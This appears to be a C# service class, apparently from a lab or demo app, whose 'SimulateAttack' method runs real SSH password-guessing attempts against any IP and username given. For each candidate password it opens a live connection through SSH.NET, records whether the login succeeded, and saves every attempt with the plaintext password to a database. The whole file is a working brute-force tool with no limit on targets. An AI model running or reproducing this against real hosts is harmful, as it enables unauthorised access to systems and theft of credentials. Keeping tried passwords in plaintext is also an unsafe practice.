using Renci.SshNet;
using Microsoft.EntityFrameworkCore;

public class SshBruteForceService
{
    private readonly AppDbContext _db;

    public SshBruteForceService(AppDbContext db)
    {
        _db = db;
    }

    public async Task<List<SshAttemptLog>> SimulateAttack(string ip, string username, List<string> passwords)
    {
        var logs = new List<SshAttemptLog>();
        foreach (var pwd in passwords)
        {
            var log = new SshAttemptLog
            {
                IPAddress = ip,
                Username = username,
                Password = pwd,
                Timestamp = DateTime.UtcNow
            };

            try
            {
                using var client = new SshClient(ip, username, pwd);
                client.Connect();
                log.Success = client.IsConnected;
                client.Disconnect();
            }
            catch
            {
                log.Success = false;
            }

            logs.Add(log);
            _db.SshAttemptLogs.Add(log);
        }

        await _db.SaveChangesAsync();
        return logs;
    }
    public async Task<List<SshAttemptLog>> GetAllLogs()
    {
        return await _db.SshAttemptLogs
            .OrderByDescending(log => log.Timestamp)
            .ToListAsync();
    }
}